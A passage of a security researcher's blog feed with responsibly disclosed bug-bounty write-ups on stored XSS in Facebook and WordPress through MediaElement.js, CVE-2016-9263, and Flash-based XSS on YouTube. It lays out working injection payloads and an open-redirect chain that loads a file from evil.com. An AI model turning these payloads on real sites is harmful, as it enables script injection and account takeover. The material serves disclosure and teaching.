<p>So if ogVideoUrl is set toÂ <pre><code >http://evil.com/video.flv#"+alert(document.domain+" XSSed!")+"</code></pre> then Facebook will executeÂ <pre><code >log("http://evil.com/video.flv?"+alert(document.domain+" XSSed!")+"") </code></pre> and will display a nice little alert box saying &#8220;facebook.com XSSed!&#8221; <img src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f642.png" alt="ðŸ™‚" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
<blockquote><p>The reason of this is that when a browser parses a URL, it will encode special characters differently depending on the browser:</p>
<ul>
<li>Firefox will URLencode any occurence of <strong>&#8220;</strong> in the url</li>
<li>Chrome, up to version 64, would URLencode <strong>&#8220;</strong> EXCEPT in the hash part (= fragment) of the URL (note: in the latest version 65 of Chrome, this behaviour changed and now Chrome behaves like Firefox and will URLencode &#8221; even in the hash part</li>
<li>IE and Edge will NOT URLencode <strong>&#8220;</strong> in the hash part NOR the search part (= query) of the URL</li>
<li>Safari willÂ NOT URLencode <strong>&#8220;</strong> in the hash part</li>
</ul>
<p>As you can see it&#8217;s not great to let the browser decide how to encode special characters in URLs in your javascript code!</p></blockquote>
<p>I reported the vulnerability right away to Facebook and they replied the next day and told me they modified the Flash file so that it doesn&#8217;t useÂ setTimeout any more,Â  the Flash would now sendÂ <pre><code >log("http://evil.com/video.flv?\"payload")</code></pre> and as you can see <strong>&#8220;</strong> is properly escaped to <strong>\&#8221;</strong> and there is no XSS any more.</p>
<p>&nbsp;</p>
<h2>2. Stored XSS without Flash</h2>
<p>The previous XSS required Flash so I checked if I could find another payload without Flash.</p>
<p>If ogVideoType was &#8220;video/vimeo&#8221;, the following code would execute</p>
<pre><code ><span class="objectBox objectBox-text " role="presentation">ogVideoUrl </span>=Â <span class="objectBox objectBox-text " role="presentation">absolutizeUrl(ogVideoUrl);</span></p>
<p><span class="objectBox objectBox-text " role="presentation">ogVideoUrl = ogVideoUrl.substr(ogVideoUrl.lastIndexOf('/') + 1);</span></p>
<p>playerDiv.innerHTMLÂ = '&lt;iframe src="https://player.vimeo.com/video/' + <span class="objectBox objectBox-text " role="presentation">ogVideoUrl </span>+ '?api=1"&gt;&lt;/iframe&gt;';</p>
<p></code></pre>
<p>As you can seeÂ <span class="objectBox objectBox-text " role="presentation">absolutizeUrl(ogURL) is not urlencoded before being injected toÂ playerDiv.innerHTML, so with ogVideoUrl set to <pre><code >http://evil.com/#" onload="alert(document.domain)"</code></pre>Â playerDiv.innerHTML would beÂ <pre><code >&lt;iframe src="https://player.vimeo.com/video/#" onload="alert(document.domain)" ?api=1"&gt;&lt;/iframe&gt; </code></pre></span></p>
<p><span class="objectBox objectBox-text " role="presentation">which is again an XSS on facebook.com!</span></p>
<p>&nbsp;</p>
<p>I reported this on the same day the previous XSS was fixed and Facebook fixed it again in 1 day like this :</p>
<p><span class="objectBox objectBox-text " role="presentation"><pre><code ></span></p>
<p><span class="objectBox objectBox-text " role="presentation">ogVideoUrl </span>=Â <span class="objectBox objectBox-text " role="presentation">absolutizeUrl(ogVideoUrl);</span></p>
<p><span class="objectBox objectBox-text " role="presentation">ogVideoUrl = ogVideoUrl.substr(ogVideoUrl.lastIndexOf('/') + 1);</span></p>
<p>playerDiv.innerHTMLÂ = '&lt;iframe src="https://player.vimeo.com/video/' + <span class="objectBox objectBox-text " role="presentation">ogVideoUrl</span><span class="objectBox objectBox-text " role="presentation">.split('"').join('&amp;quot;')</span>Â + '?api=1"&gt;&lt;/iframe&gt;'</p>
<p><span class="objectBox objectBox-text " role="presentation"></code></pre></span></p>
<p>Here is a video of this XSS in action :</p>
<div class="jetpack-video-wrapper"><iframe loading="lazy" title="Facebook XSS" width="1170" height="658" src="https://www.youtube.com/embed/Q9bsKjUd1hM?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></div>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>The next day, I found another vulnerable endpoint: when ogVideoType was something unknown, like &#8220;video/nothing&#8221;, Facebook would display an error message with a link to <span class="objectBox objectBox-text " role="presentation">ogVideoUrl </span> like this:</p>
<p><span class="objectBox objectBox-text " role="presentation"><pre><code ></span>errorDiv.innerHTMLÂ = '&lt;a href="' +<span class="objectBox objectBox-text " role="presentation">absolutizeUrl(ogVideoUrl )</span> + '"&gt;'<span class="objectBox objectBox-text " role="presentation"></code></pre></span></p>
<p>So with the <span class="objectBox objectBox-text " role="presentation">ogVideoUrlÂ </span>payloadÂ <span class="objectBox objectBox-text " role="presentation"><pre><code ></span>/#"&gt;&lt;img/src="xxx"onerror="alert(document.domain)<span class="objectBox objectBox-text " role="presentation"></code></pre></span>Â errorDiv.innerHTML would beÂ <span class="objectBox objectBox-text " role="presentation"><pre><code ></span>&lt;a href="/#"&gt;&lt;img src="xxx" onerror="alert(document.domain)"&gt;<span class="objectBox objectBox-text " role="presentation"></code></pre></span></p>
<p>&nbsp;</p>
<p>I reported it to Facebook and, funny enough, Neil from Facebook WhiteHat told me he was planning to check this code the next day!</p>
<p>&nbsp;</p>
<h2>3. Oh, and one more thing&#8230;</h2>
<p>Another possible ogVideoType was &#8220;silverlight&#8221;. <a href="https://www.microsoft.com/silverlight/">Silverlight</a>Â is a browser plugin by Microsoft and is to Flash what VBscript was to javascript.</p>
<p>The silverlight file hosted on Facebook (silverlightmediaelement.xap) was loaded like this:</p>
<p><span class="objectBox objectBox-text " role="presentation"><pre><code ></span></p>
<p>params = ["file=" + <span class="objectBox objectBox-text " role="presentation">ogVideoUrl</span><span class="objectBox objectBox-text " role="presentation">, "id=playerID"</span>];</p>
<p>silverlightDiv.innerHTML ='&lt;object data="data:application/x-silverlight-2," type="application/x-silverlight-2"&gt;&lt;param name="initParams" value="' + params.join(',').split('"').join('&amp;quot;') + '" /&gt;&lt;/object&gt;';</p>
<p><span class="objectBox objectBox-text " role="presentation"></code></pre></span></p>
<p>silverlightmediaelement.xapÂ would then send log information to Facebook javascript a little bit like the Flash file did, but this time it didn&#8217;t contain <span class="objectBox objectBox-text " role="presentation">ogVideoUrl</span> but only the player id, which is another parameter sent inÂ initParams and defined by Facebook. Silverlight would call the javascript function <strong>[id]_init()</strong>Â where [id] is &#8220;playerID&#8221;.</p>
<p>InÂ silverlight, parameters are not separated by <strong>&amp;</strong>Â like in urls or in Flash but by <strong>,</strong></p>
<p>If <span class="objectBox objectBox-text " role="presentation">ogVideoUrlÂ </span>contains a <strong>,</strong> then every thing after this comma will be considered as another parameter by silverlight, which means that using the payloadÂ  <span class="objectBox objectBox-text " role="presentation"><pre><code ></span>/#,id=alert(document.domain)&amp; <span class="objectBox objectBox-text " role="presentation"></code></pre></span> then silverlight be loaded like this:</p>
<p><span class="objectBox objectBox-text " role="presentation"><pre><code ></span>silverlightDiv.innerHTML ='&lt;object data="data:application/x-silverlight-2," type="application/x-silverlight-2"&gt;&lt;param name="initParams" value="file=/#,id=alert(document.domain)&amp;,id=playerID" /&gt;&lt;/object&gt;'; <span class="objectBox objectBox-text " role="presentation"></code></pre></span></p>
<p>Silverlight will only take into account the first occurence of id and it will set its value toÂ  <span class="objectBox objectBox-text " role="presentation"><pre><code ></span>alert(document.domain)&amp; <span class="objectBox objectBox-text " role="presentation"></code></pre></span></p>
<p>Silverlight will then call the following javascript :Â  <span class="objectBox objectBox-text " role="presentation"><pre><code ></span>alert(document.domain)&amp;_init() <span class="objectBox objectBox-text " role="presentation"></code></pre></span> which means XSS again!</p>
<p>&nbsp;</p>
<p>I reported it the same day and Neal replied that they would remove all the MediaElement component and replace it with a new way of handling external videos!</p>
<p>&nbsp;</p>
<h2>What about WordPress ?</h2>
<p>All this vulnerable code wasn&#8217;t developed by Facebook, they used an open source libraryÂ <a href="http://www.mediaelementjs.com/">MediaElementjs</a>Â which was (and still is) a popular module to embed video in a webpage, especially because they had a Flash fallback for older browsers. In particular, WordPress uses this module by default when handling <a href="https://codex.wordpress.org/Shortcode_API">shortcodes</a>. The vulnerabilities were also present in WordPress and allowed stored XSS in WordPress comments or in WordPress articles written by authors (in WordPress, the Author role isn&#8217;t allowed to execute javascript).</p>
<p>I reported the vulnerabilities to WordPress to which I already reported <a href="/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/">another vulnerability</a>Â monthes before. They informed MediaElementjs team about this and told me they were working on a fix. On February 2018 they finally released the fix for all the XSS related to MediaElementjs.</p>
<p>&nbsp;</p>
<h2>Conclusion</h2>
<p>I learned a lot and had a lot of fun finding these vulnerabilities. I hope you also enjoy it!</p>
<p>Here is some advices :</p>
<blockquote><p>Open Graph (and alternatives like json-ld) is a great way to display rich external content on a website, but you should be careful about it (think SSRF, XSS and Clickjacking)</p>
<p>Don&#8217;t let the browser parse URL for you in your javascript code, each browser handles it his own way and a browser can change its behavior anytime (like Chrome 64 -&gt; 65). Use white-list regex instead.</p>
<p>Complex, dynamic XSSes that use XHR, DOM mutations, and external content will NOT be detected by automatic tools (for now). So even the most secure, high profile website can be vulnerable. Code review and debugging are the way to go for these!</p>
<p>Don&#8217;t be afraid of large, minified, dynamic javascript source code. If you spot some potentially dangerous features on a website, you&#8217;re free to check how it is implemented!</p>
<p>Facebook WhiteHat is a great Bug Bounty program! Thanks Neal and all the team <img src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f642.png" alt="ðŸ™‚" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p></blockquote>
<p>Thanks for reading, and feel free to comment if something isn&#8217;t clear.</p>
<p>&nbsp;</p>
<p>Happy hunting !</p>

<div class="twitter-share"><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fopnsec.com%2F2018%2F03%2Fstored-xss-on-facebook%2F&#038;via=opnsec" class="twitter-share-button">Tweet</a></div>
]]></content:encoded>
					
					<wfw:commentRss>/2018/03/stored-xss-on-facebook/feed/</wfw:commentRss>
			<slash:comments>2</slash:comments>
		
		<enclosure url="https://example.com/video.flv" length="606" type="video/x-flv" />
<enclosure url="http://evil.com/video.flv?" length="863" type="video/x-flv" />
<enclosure url="http://evil.com/video.flv?" length="863" type="video/x-flv" />
<enclosure url="http://evil.com/video.flv#" length="863" type="video/x-flv" />
<enclosure url="http://evil.com/video.flv#%22payload" length="863" type="video/x-flv" />
<enclosure url="http://evil.com/video.flv?" length="863" type="video/x-flv" />
<enclosure url="http://evil.com/video.flv?" length="863" type="video/x-flv" />
<enclosure url="http://evil.com/video.flv?" length="863" type="video/x-flv" />
<enclosure url="http://evil.com/video.flv?" length="863" type="video/x-flv" />
<enclosure url="http://evil.com/video.flv?" length="863" type="video/x-flv" />
<enclosure url="http://evil.com/video.flv?" length="863" type="video/x-flv" />
<enclosure url="http://evil.com/video.flv?" length="863" type="video/x-flv" />
<enclosure url="http://evil.com/video.flv?" length="863" type="video/x-flv" />
<enclosure url="http://evil.com/video.flv?" length="863" type="video/x-flv" />
<enclosure url="http://evil.com/video.flv?" length="867" type="video/x-flv" />
<enclosure url="http://evil.com/video.flv?" length="867" type="video/x-flv" />
<enclosure url="http://evil.com/video.flv?%22payload" length="867" type="video/x-flv" />

		<post-id xmlns="com-wordpress:feed-additions:1">242</post-id>	</item>
		<item>
		<title>FlashME! &#8211; WordPress vulnerability disclosure [CVE-2016-9263]</title>
		<link>/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/?utm_source=rss&#038;utm_medium=rss&#038;utm_campaign=flashme-wordpress-vulnerability-disclosure-cve-2016-9263</link>
					<comments>/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/#comments</comments>
		
		<dc:creator><![CDATA[Engue Gillier]]></dc:creator>
		<pubDate>Thu, 19 Oct 2017 12:27:10 +0000</pubDate>
				<category><![CDATA[Uncategorized]]></category>
		<guid isPermaLink="false">/?p=220</guid>

					<description><![CDATA[Last week, I disclosed the existence of an unpatched Flash vulnerability on WordPress (/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/). Today, I disclose technical details about this vulnerability. However, contrary to what I announced before, I won&#8217;t provide a POC nor enough technical details to allow attackers to exploit it. Responsible disclosure of unpatched vulnerabilities is never easy, and I&#8217;m trying&#8230; <a class="read-more" href="/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/">Read More</a>]]></description>
										<content:encoded><![CDATA[<p><img loading="lazy" class="alignnone size-thumbnail wp-image-235" style="display: none;" src="/wp-content/uploads/2017/10/FlashMEcropped-150x150.png" alt="" width="150" height="150" />Last week, I disclosed the existence of an unpatched Flash vulnerability on WordPress (<a href="/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/">/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/</a>). Today, I disclose technical details about this vulnerability. However, contrary to what I announced before, I won&#8217;t provide a POC nor enough technical details to allow attackers to exploit it. Responsible disclosure of unpatched vulnerabilities is never easy, and I&#8217;m trying to do this right both ethically and legally.</p>
<p>If you want to know more about the type of vulnerability, the impact and how to patch it please refer to <a href="/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/">/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/</a>.</p>
<h3>Technical details</h3>
<p>WordPress uses an independent open-source tool to play videos in a webpage, MediaElement.js. ME.js provides a Flash fallback for browsers that don&#8217;t support the &lt;video&gt; tag or certain video codecs, using the flash file FlashMediaElement.swf. Vulnerabilities on this file have been reported in the past, like the awesome Flash based XSS found by <a href="https://twitter.com/cure53berlin" target="_blank" rel="noopener noreferrer">cure53</a> <a href="https://gist.github.com/cure53/df34ea68c26441f3ae98f821ba1feb9c">https://gist.github.com/cure53/df34ea68c26441f3ae98f821ba1feb9c</a>.</p>
<p>While investigating the source of this file in summer 2016, one particular instruction catched my attention</p>
<pre><code >Security.allowDomain("www.[XYZ].com");</code></pre>
<blockquote><p>Note: I changed the real name of the domain to [XYZ].com</p></blockquote>
<p><a href="http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/system/Security.html#allowDomain()" target="_blank" rel="noopener noreferrer">Security.allowDomain()</a> can be described as a vulnerable function: using it will downplay the <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy" target="_blank" rel="noopener noreferrer">Same-Origin Policy</a> which is the basis of website client-side security. You can read more about Flash security sandbox model <a href="http://www.senocular.com/flash/tutorials/contentdomains/" target="_blank" rel="noopener noreferrer">here</a>.</p>
<p>This code will allow a Flash file hosted on [XYZ].com to execute code on the FlashMediaElement.swf file, which is hosted on the WordPress site domain. [XYZ].com is a very well established company, so you could safely think that they would not use this privilege to execute malicious code on your website, the same way you would allow Google Analytics or Youtube to run scripts on your website. However, it is not that simple. With Security.allowDomain(&#8220;www.[XYZ].com&#8221;), you allow not only one specific file hosted on [XYZ].com to access your Flash security sandbox but any Flash file hosted on [XYZ].com.</p>
<blockquote><p>Quick reminder about <a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)" target="_blank" rel="noopener noreferrer">Cross-Site Scripting</a>:Â XSS is the ability to execute arbitrary code (script, in this case Flash ActionScript3) in an external website. Not only a XSS allows you to access private info (like cookies) and private functions (like xhr requests) on the external website, but the arbitrary code will also be considered by the browser (or the Flash player) to be originating from the vulnerable website. This subtlety is what we will exploit here.</p></blockquote>
<p>The thing is that [XYZ].com is vulnerable itself to XSS, or in this case Cross-Site Flashing. Which means that an attacker can execute arbitrary Flash code that will be considered by the Flash player as being originating from [XYZ].com. This forms a chain of vulnerabilities that will end up with any WordPress website being vulnerable to Cross-Site Flashing. Let&#8217;s make a drawing:</p>
<p><a href="/wp-content/uploads/2017/10/FlashME.svg"><img loading="lazy" class="wp-image-228 aligncenter" src="/wp-content/uploads/2017/10/FlashME.svg" alt="" width="969" height="485" /></a></p>
<p>&nbsp;</p>
<h3>Facebook was vulnerable, too</h3>
<p>A few months after reporting this issue, I was investigating various Flash files on facebook.com. One file contained the following instruction:</p>
<pre><code >Security.allowDomain("www.[XYZ].com");</code></pre>
<p>Facebook was using a file similar to flashmediaelement.swf to embed external videos on Facebook wall. The same vulnerability was present in this file and I was able to create various POC exploits using this vulnerability that would lead to Facebook OAuth bypass and even Facebook account takeover without user interaction.</p>
<p>I reported the issue to <a href="https://www.facebook.com/whitehat" target="_blank" rel="noopener noreferrer">Facebook WhiteHat </a>program and Facebook Security Team quickly fixed the issue and generously rewarded me.</p>
<h3>Conclusion</h3>
<p>This vulnerability is complex because it relies on multiple factors, technologies and companies. However, once an attacker is able to create an exploit, exploiting this vulnerability is easy because all of the requirements are usually present by default on a system. This vulnerability not only affects WordPress websites, but every websites hosted on the same subdomain as a WordPress website.</p>
<p>I hope WordPress will patch this issue soon and that my report will help raise awareness about Chained XSS vulnerabilities. Thanks for reading!</p>

<div class="twitter-share"><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fopnsec.com%2F2017%2F10%2Fflashme-wordpress-vulnerability-disclosure-cve-2016-9263%2F&#038;via=opnsec" class="twitter-share-button">Tweet</a></div>
]]></content:encoded>
					
					<wfw:commentRss>/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/feed/</wfw:commentRss>
			<slash:comments>3</slash:comments>
		
		
		<post-id xmlns="com-wordpress:feed-additions:1">220</post-id>	</item>
		<item>
		<title>[CVE-2016-9263] XSF vulnerability in WordPress [UPDATED]</title>
		<link>/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/?utm_source=rss&#038;utm_medium=rss&#038;utm_campaign=cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress</link>
					<comments>/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/#comments</comments>
		
		<dc:creator><![CDATA[Engue Gillier]]></dc:creator>
		<pubDate>Thu, 12 Oct 2017 14:28:34 +0000</pubDate>
				<category><![CDATA[Uncategorized]]></category>
		<guid isPermaLink="false">/?p=209</guid>

					<description><![CDATA[Please patch this issue on your WordPress websites immediately and ask WordPress to release a patched version before I publicly release technical details about this on Oct 19th 2017 What is the vulnerability ? There is an unpatched vulnerability in latest and older WordPress releases. The vulnerability is a cross-domain Flash injection (XSF), which impact&#8230; <a class="read-more" href="/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/">Read More</a>]]></description>
										<content:encoded><![CDATA[<h3><img loading="lazy" class="wp-image-213 aligncenter" src="/wp-content/uploads/2017/10/wordpress-vulnerable-1.jpg" alt="" width="528" height="276" srcset="/wp-content/uploads/2017/10/wordpress-vulnerable-1.jpg 905w, /wp-content/uploads/2017/10/wordpress-vulnerable-1-300x157.jpg 300w, /wp-content/uploads/2017/10/wordpress-vulnerable-1-768x401.jpg 768w" sizes="(max-width: 528px) 100vw, 528px" /></h3>
<h5><strong>Please patch this issue on your WordPress websites immediately and ask WordPress to release a patched version before I publicly release technical details about this on Oct 19th 2017</strong></h5>
<h3>What is the vulnerability ?</h3>
<p>There is an <strong>unpatched vulnerability in latest and older WordPress releases</strong>. The vulnerability is a cross-domain Flash injection (<strong>XSF</strong>), which impact is <strong>similar to a Reflected XSS</strong> (or Same-Origin policy bypass).<br />
The vulnerable file is located at /wp-includes/js/mediaelement/<strong>flashmediaelement.swf</strong>.</p>
<h3>Who is affected ?</h3>
<p>Any up-to-date or older (for at least 2 years) version of WordPress is vulnerable by default. <strong>Every WordPress website is vulnerable</strong> to this as well as <strong>any other website hosted on the same subdomain</strong> as a WordPress website.</p>
<p>The only WordPress websites that are not affected are those where the vulnerable file, flashmediaelement.swf, is hosted on a sandboxed domain. This is the case for sites hosted on wordpress.com for example.</p>
<h3>What is the impact ?</h3>
<p>The impact is similar to an (authenticated) Reflected XSS, except you can&#8217;t manipulate the DOM and read some values like header responses, and the victim must have Flash active. The attacker can send a malicious link that would execute arbitrary Flash code on the WordPress security sandbox. When a victim opens the malicious link, the attacker can perform &#8220;xhr style&#8221; requests with Flash to any URL in the WordPress domain, using the victim&#8217;s cookies. Attacker can then read the response source code (body) and steal the victims private info including any CSRF token. He can use the CSRF token to perform CSRF actions on behalf of the user. In the case of Facebook for example, this led to Facebook account takeover after the victim clicked on the malicious link.</p>
<p>Because this is a Same-Origin policy bypass, the attacker can exploit this not only on the vulnerable WordPress site but also on any website located in the same subdomain (or same Origin) than the vulnerable WordPress site.</p>
<h3>How to patch this ?</h3>
<p>WordPress decided not to patch this issue for some (bad?) reasons. You should simply <strong>remove the vulnerable file</strong> at [WordPress_Home_URL]/wp-includes/js/mediaelement/flashmediaelement.swf (which is just a Flash fallback for embed videos not hosted on a streaming website).</p>
<p>Or you can <strong>redirect</strong> [WordPress_Home_URL]/wp-includes/js/mediaelement/flashmediaelement.swf <strong>to a sandboxed domain</strong>, for example to https://x0.wp.com/wp-includes/js/mediaelement/flashmediaelement.swf.</p>
<p>Either of these solutions will mitigate this issue.</p>
<h3>What is the timeline of this vulnerability report ?</h3>
<ul>
<li>Aug 5th <strong>2016</strong>: I reported this issue to Automattic, then WordPress private Bug Bounty program, more than a year ago. WordPress contacted the author of the vulnerable code, mediaelement.js (created by John Dyer @johndyer), which provided a patched file very quickly. WordPress decided not to release the patch.<cite></cite><cite class="_Rm"></cite></li>
<li>Sep 15th 2016: I found that Facebook was using the same vulnerable code, so <strong>facebook.com was vulnerable to the same XSF vulnerability</strong> (similar to a reflected XSS on facebook.com). I reported it to Facebook which fixed it in 5 days.</li>
<li>Nov 11th 2016: I requested a CVE for this to MITRE and was assigned <strong><span class="il">CVE</span>-2016-9263</strong></li>
<li>Sep 15th <strong>2017</strong>: I informed WordPress Security Team that I was going to publicly disclose <span class="il">CVE</span>-2016-9263</li>
<li>Oct 12th 2017: I publicly disclose the issue on my blog without any technical detail but with instructions how to patch.</li>
<li><strong>Oct 19th 2017: I will publicly disclose technical details</strong> about this vulnerability, including <span style="text-decoration: line-through;"><strong>how to exploit it</strong></span> [UPDATE]: <strong>Limited technical details</strong> are now available <a href="/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/"><strong>here</strong></a></li>
</ul>
<h3>Why are you publicly disclosing this ?</h3>
<p>I reported this issue to WordPress more than a year ago, with a working proof of concept, technical details and how to patch the issue. WordPress choose not to release the patch quickly provided by mediaelement.js team. On the other hand, Facebook patched the issue in 5 days. WordPress obviously has less resource than Facebook but this is not a valid excuse because it is the most used Website software in the world, and the patch has been ready for more than a year. They made a poor decision that endangers their users and many websites.</p>
<p>I already reported this vulnerability to large websites like Uber, Spotify, etc&#8230;Â  for many of which their main website was vulnerable because of this vulnerability in their WordPress site. Many of them patched it themselves. It is possible that this is now exploited as a consequence of the reports I sent to these organisations. I don&#8217;t accept that the public is not informed about this vulnerability.</p>
<p><strong>Please patch this issue on your WordPress websites immediately and ask WordPress to release a patched version before I publicly release technical details about this on Oct 19th 2017.</strong></p>
<h3>How can I contact you ?</h3>
<p>You can find me on twitter (<strong>@opnsec</strong>). You can also contact me at wordpress /at\ opnsec /dot\ com.</p>

<div class="twitter-share"><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fopnsec.com%2F2017%2F10%2Fcve-2016-9263-unpatched-xsf-vulnerability-in-wordpress%2F&#038;via=opnsec" class="twitter-share-button">Tweet</a></div>
]]></content:encoded>
					
					<wfw:commentRss>/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/feed/</wfw:commentRss>
			<slash:comments>3</slash:comments>
		
		
		<post-id xmlns="com-wordpress:feed-additions:1">209</post-id>	</item>
		<item>
		<title>Advanced Flash vulnerabilities in Youtube &#8211; Part 4</title>
		<link>/2017/09/advanced-flash-vulnerabilities-in-youtube-part-4/?utm_source=rss&#038;utm_medium=rss&#038;utm_campaign=advanced-flash-vulnerabilities-in-youtube-part-4</link>
					<comments>/2017/09/advanced-flash-vulnerabilities-in-youtube-part-4/#comments</comments>
		
		<dc:creator><![CDATA[Engue Gillier]]></dc:creator>
		<pubDate>Wed, 13 Sep 2017 13:51:02 +0000</pubDate>
				<category><![CDATA[Flash]]></category>
		<category><![CDATA[Vulnerability]]></category>
		<category><![CDATA[XSS]]></category>
		<category><![CDATA[Youtube]]></category>
		<guid isPermaLink="false">/?p=188</guid>

					<description><![CDATA[IV. Flash based XSSes on Youtube iframe api I&#8217;m happy that people found my previous posts on Youtube Flash vulnerabilities interesting, and I will keep posting new write-ups. This time I will disclose 3 Flash based XSSes on the new Youtube html5 api (with Flash fallback). Youtube html5 api is called Youtube iframe api, because&#8230; <a class="read-more" href="/2017/09/advanced-flash-vulnerabilities-in-youtube-part-4/">Read More</a>]]></description>
										<content:encoded><![CDATA[<h3>IV. Flash based XSSes on Youtube iframe api</h3>
<p><img loading="lazy" class="alignnone size-medium wp-image-203" style="display: none;" src="/wp-content/uploads/2017/09/Youtube-iframe-Api.png" alt="" width="1" height="1" srcset="/wp-content/uploads/2017/09/Youtube-iframe-Api.png 1133w, /wp-content/uploads/2017/09/Youtube-iframe-Api-150x150.png 150w, /wp-content/uploads/2017/09/Youtube-iframe-Api-300x146.png 300w, /wp-content/uploads/2017/09/Youtube-iframe-Api-768x375.png 768w, /wp-content/uploads/2017/09/Youtube-iframe-Api-1024x500.png 1024w, /wp-content/uploads/2017/09/Youtube-iframe-Api-640x360.png 640w" sizes="(max-width: 1px) 100vw, 1px" />I&#8217;m happy that people found my <a href="/2017/08/advanced-flash-vulnerabilities-in-youtube/">previous posts on Youtube Flash vulnerabilities</a> interesting, and I will keep posting new write-ups.<br />
This time I will disclose 3 Flash based XSSes on the new Youtube html5 api (with Flash fallback).</p>
<p>Youtube html5 api is called <a href="https://developers.google.com/youtube/iframe_api_reference" target="_blank" rel="noopener noreferrer">Youtube iframe api</a>, because the entry point is an iframe located at youtube.com/embed/[VIDEO_ID].<br />
When the iframe loads, it will first check if the browser is able to play videos using html5, and if not it will use the Flash fallback. Until recently, it was possible to force the Flash fallback for all browsers using the URL parameter nohtml5=1. This is what we will do here.</p>
<p>Here is the workflow of the Youtube iframe api with Flash fallback:</p>
<p><a href="/wp-content/uploads/2017/09/Diagramme8.svg"><img loading="lazy" class="wp-image-189 aligncenter" src="/wp-content/uploads/2017/09/Diagramme8.svg" alt="" width="675" height="449" /></a></p>
<p>If you compare with the workflow of the Youtube Flash api in <a href="/2017/08/advanced-flash-vulnerabilities-in-youtube/" target="_blank" rel="noopener noreferrer">part 1</a>, the Flash file &#8220;Youtube Wrapper&#8221; has been replaced by the iframe &#8220;Youtube Embed&#8221;, and consequently Flash to javascript api has been replaced by postMessage api and sharedEvent api has been replaced by Flash to javascript api. This should give you a sense of how Flash and javascript are very similar, only the implementation is different.</p>
<blockquote><p>Youtube Flash api and Youtube iframe api are so similar that <a href="https://bugzilla.mozilla.org/show_bug.cgi?format=default&amp;id=769117" target="_blank" rel="noopener noreferrer">Firefox </a>, <a href="https://groups.google.com/a/chromium.org/forum/#!msg/chromium-dev/BW8g1iB0jLs/uddWuBroBAAJ" target="_blank" rel="noopener noreferrer">Chrome </a>and <a href="https://github.com/WebKit/webkit/blob/master/Source/WebCore/Modules/plugins/YouTubePluginReplacement.cpp" target="_blank" rel="noopener noreferrer">Safari </a>have implemented an interesting/weird <a href="https://github.com/whatwg/html/issues/2390" target="_blank" rel="noopener noreferrer">behaviour </a>where any &lt;object data=&#8221;youtube.com/v/[VIDEO_ID]&#8221;&gt; (Youtube Flash api) will be automatically replaced by &lt;object data=&#8221;youtube.com/embed/[VIDEO_ID]&#8221;&gt;(Youtube iframe api) where the &lt;object&gt; will actually behave as an iframe. The objective is to force old websites to switch to Youtube iframe api without making any change in the websites themselves.</p></blockquote>
<p>To trigger a Flash based XSS on youtube.com, you have to either load a Flash file located at youtube.com directly from the address bar, or exploit any Flash file embed in a html page located at youtube.com. Here we will exploit the Flash file &#8220;Main App&#8221; which is embed in youtube.com/embed, and from there we will execute arbitrary javascript on youtube.com/embed.<br />
When an external website embeds a Youtube iframe, it can send <a href="https://developers.google.com/youtube/iframe_api_reference#Functions" target="_blank" rel="noopener noreferrer">commands </a>to the Youtube iframe using the postMessage api such as playVideo(), pauseVideo(), etc&#8230; The Youtube iframe will then transmit the command to the Flash Main App (using the Flash to javascript api).</p>
<p>&nbsp;</p>
<h3>1. Flash based XSS using loadPlaylist command</h3>
<p>One particular command is <a href="https://developers.google.com/youtube/iframe_api_reference#loadPlaylist" target="_blank" rel="noopener noreferrer">loadPlaylist()</a> which will make the Youtube iframe load a playlist. The argument of loadPlaylist() can either be a Youtube playlist ID or an array of Youtube video IDs. When using an array of Youtube video IDs, it is possible to inject arbitrary poster (thumbnail) image url for each video.<br />
Loading an image in Flash is similar to loading an external Flash file using Loader.load(), so we could load an arbitrary Flash file using this. Main App checks if the url of the poster image is a youtube.com url and then loads the image. Now you might be aware that Google doesn&#8217;t believe that open redirections are security issues! This makes url sanitization very difficult, because you just need to provide a youtube.com url that will redirect to an arbitrary location. I didn&#8217;t find an open redirector directly on youtube.com. However, I found a youtube.com url that will redirect to any google.com url. From there it was easy to find an open redirector on google.com that would redirect to evil.com. The full url payload was <pre><code >https://accounts.youtube.com/accounts/SetSID?continue=https://www.google.com/amp/s/evil.com/evil.swf</code></pre><br />
Once evil.swf is loaded on youtube.com/embed it can execute arbitrary javascript using the Flash to javascript api, which means XSS on youtube.com!</p>
<blockquote><p>Note: By default only Flash file located on the same domain than the html host page can use the Flash to javascript api. But in youtube.com/embed/[VIDEO_ID] the Main App &lt;object&gt; tag contains the attribute &#8220;<a href="https://helpx.adobe.com/flash/kb/control-access-scripts-host-web.html" target="_blank" rel="noopener noreferrer">allowscriptaccess=always</a>&#8221; which means that any Flash file loaded by the Main App will be able to use the Flash to javascript api on youtube.com/embed/[VIDEO_ID]</p></blockquote>
<p>Here is the workflow of the POC:</p>
